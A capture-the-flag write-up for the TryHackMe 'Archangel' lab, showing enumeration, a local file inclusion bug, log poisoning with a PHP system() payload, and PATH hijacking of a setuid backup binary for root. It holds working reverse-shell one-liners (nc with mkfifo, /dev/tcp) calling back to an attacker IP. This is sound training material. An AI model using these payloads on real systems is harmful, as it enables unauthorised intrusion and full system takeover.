## Archangel
https://tryhackme.com/room/archangel

## Enum
```
nmap -Pn -sC -sV -sS -p- ip.thm --open -vv
```
```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-15 17:04 JST
Scanning ip.thm (10.10.49.173) [65535 ports]
Discovered open port 22/tcp on 10.10.49.173
Discovered open port 80/tcp on 10.10.49.173
Not shown: 65526 closed tcp ports (reset), 7 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPrwb4vLZ/CJqefgxZMUh3zsubjXMLrKYpP8Oy5jNSRaZynNICWMQNfcuLZ2GZbR84iEQJrNqCFcbsgD+4OPyy0TXV1biJExck3OlriDBn3g9trxh6qcHTBKoUMM3CnEJtuaZ1ZPmmebbRGyrG03jzIow+w2updsJ3C0nkUxdSQ7FaNxwYOZ5S3X5XdLw2RXu/o130fs6qmFYYTm2qii6Ilf5EkyffeYRc8SbPpZKoEpT7TQ08VYEICier9ND408kGERHinsVtBDkaCec3XmWXkFsOJUdW4BYVhrD3M8JBvL1kPmReOnx8Q7JX2JpGDenXNOjEBS3BIX2vjj17Qo3V
|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKhhd/akQ2OLPa2ogtMy7V/GEqDyDz8IZZQ+266QEHke6vdC9papydu1wlbdtMVdOPx1S6zxA4CzyrcIwDQSiCg=
|   256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBE3FV9PrmRlGbT2XSUjGvDjlWoA/7nPoHjcCXLer12O
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Wavefire
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
ffuf -u http://ip.thm/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

```
________________________________________________

.hta                    [Status: 403, Size: 271, Words: 20, Lines: 10, Duration: 435ms]
.htaccess               [Status: 403, Size: 271, Words: 20, Lines: 10, Duration: 435ms]
.htpasswd               [Status: 403, Size: 271, Words: 20, Lines: 10, Duration: 3022ms]
flags                   [Status: 301, Size: 300, Words: 20, Lines: 10, Duration: 421ms]
images                  [Status: 301, Size: 301, Words: 20, Lines: 10, Duration: 462ms]
index.html              [Status: 200, Size: 19188, Words: 2646, Lines: 321, Duration: 445ms]
layout                  [Status: 301, Size: 301, Words: 20, Lines: 10, Duration: 428ms]
pages                   [Status: 301, Size: 300, Words: 20, Lines: 10, Duration: 429ms]
server-status           [Status: 403, Size: 271, Words: 20, Lines: 10, Duration: 423ms]
:: Progress: [4713/4713] :: Job [1/1] :: 88 req/sec :: Duration: [0:00:55] :: Errors: 0 ::
```

```
curl http://ip.thm/flags -L
```
```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /flags</title>
 </head>
 <body>
<h1>Index of /flags</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="flag.html">flag.html</a></td><td align="right">2020-11-19 18:45  </td><td align="right"> 93 </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.29 (Ubuntu) Server at ip.thm Port 80</address>
</body></html>
```

```
curl http://ip.thm/flags/flag.html -L
```
```
<meta http-equiv="Refresh" content="0; url='https://www.youtube.com/watch?v=dQw4w9WgXcQ'" />
```
![image](https://user-images.githubusercontent.com/6504854/184794308-fb832902-0e6f-4f8f-9ccc-6b07358dcf42.png)

🏴 👊👊👊 Do I need to find a different hostname...???

![image](https://user-images.githubusercontent.com/6504854/184795518-debbe329-3b06-4f36-99a3-fa52469930f1.png)
![image](https://user-images.githubusercontent.com/6504854/184795709-1a2cf195-7427-4a39-8a08-b3bf12247238.png)
![image](https://user-images.githubusercontent.com/6504854/184796237-adcf27fc-55fb-4c55-962c-5956314c0bcb.png)

```
ffuf -u http://mafialive.thm/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```
```
________________________________________________

.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 4457ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 5645ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 7642ms]
index.html              [Status: 200, Size: 59, Words: 2, Lines: 4, Duration: 479ms]
robots.txt              [Status: 200, Size: 34, Words: 3, Lines: 3, Duration: 646ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 440ms]
:: Progress: [4713/4713] :: Job [1/1] :: 79 req/sec :: Duration: [0:01:01] :: Errors: 0 ::
```

```
curl http://mafialive.thm/robots.txt
```
```
User-agent: *
Disallow: /test.php
```
![image](https://user-images.githubusercontent.com/6504854/184806425-7ef4a11a-10f3-47ba-97ce-69037012897f.png)
![image](https://user-images.githubusercontent.com/6504854/184806468-80fc0b5a-bed7-49a9-b37b-85e791e77e8e.png)
![image](https://user-images.githubusercontent.com/6504854/184806580-7b6ca63f-f809-4a04-bac8-f94fa2917123.png)
![image](https://user-images.githubusercontent.com/6504854/184806744-54b5c6a8-17a1-4c7d-b7fd-c8be46f48306.png)

```
curl http://mafialive.thm/test.php?view=/var/www/html/development_testing/./.././.././.././../etc/passwd
```

```
<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>

    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash
    </div>
</body>

</html>
```
```
curl http://mafialive.thm/test.php?view=/var/www/html/development_testing/./.././.././.././../var/log/apache2/access.log
```
```
<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>

    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>

10.10.10.10 - - [16/Aug/2022:10:59:42 +0530] "GET /test.php?view=/var/www/html/development_testing/.././../../.././.././../etc/passwd HTTP/1.1" 200 482 "-" "curl/7.84.0"
10.10.10.10 - - [16/Aug/2022:11:00:06 +0530] "GET /test.php?view=/var/www/html/development_testing/test.php HTTP/1.1" 500 443 "-" "curl/7.84.0"
```
```
curl http://mafialive.thm/test.php?view=/var/www/html/development_testing/ -H "User-Agent: AAA <?php system('id'); ?> AAA"
```
```
<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>

    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
            </div>
</body>

</html>
```

```
curl http://mafialive.thm/test.php?view=/var/www/html/development_testing/./.././.././.././../var/log/apache2/access.log
```
```
10.10.10.10 - - [16/Aug/2022:11:27:21 +0530] "GET /test.php?view=/var/www/html/development_testing/ HTTP/1.1" 200 458 "-" "AAA uid=33(www-data) gid=33(www-data) groups=33(www-data)
 AAA"
```
🏴 I managed to inject RCE on apache log file via LFI.Finally it's mistery why it was able to access only with single-dot and double-dot ./../
Is it esper? I checked other's writeups,oops!

## Flag
```
nc -nlvp 4444
```
```
curl http://mafialive.thm/ -H "User-Agent: AAA <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f'); ?> AAA"
```
```
curl http://mafialive.thm/test.php?view=/var/www/html/development_testing/./.././.././.././../var/log/apache2/access.log
```
```
$　cat /home/archangel/user.txt
```
```
$ find / -user archangel 2>/dev/null
/opt/helloworld.sh
/opt/backupfiles
/home/archangel
/home/archangel/secret
/home/archangel/user.txt
/home/archangel/myfiles

$ cat /opt/helloworld.sh
#!/bin/bash
echo "hello world" >> /opt/backupfiles/helloworld.txt
$ echo "sh -i >& /dev/tcp/10.10.10.10/2222 0>&1" >> /opt/helloworld.sh
$ cd /opt
$ ./helloworld.sh
```
🏴 I got archangel shell.Let's find out root one.

![image](https://user-images.githubusercontent.com/6504854/184823270-fcd5c23d-e82e-45f3-8fda-1d808f488ec9.png)

```
$ file backup
backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9093af828f30f957efce9020adc16dc214371d45, for GNU/Linux 3.2.0, not stripped
$ ./backup
cp: cannot stat '/home/user/archangel/myfiles/*': No such file or directory
```
🏴 Backup calls cp and read hints.😉

```
$ echo '#!/bin/bash' > cp
$ echo '/bin/bash' >> cp
$ chmod +x cp
$ export PATH=/home/archangel/secret:$PATH
$ ./backup
id
uid=0(root) gid=0(root) groups=0(root),1001(archangel)
cat /root/root.txt
```

Thank you for your time! It seems to last the hottest earth ever! Happy hacking! 🍨🍨🍨😋🍨🍨🍨 

アイスの食べすぎにはご注意ください。 🥶
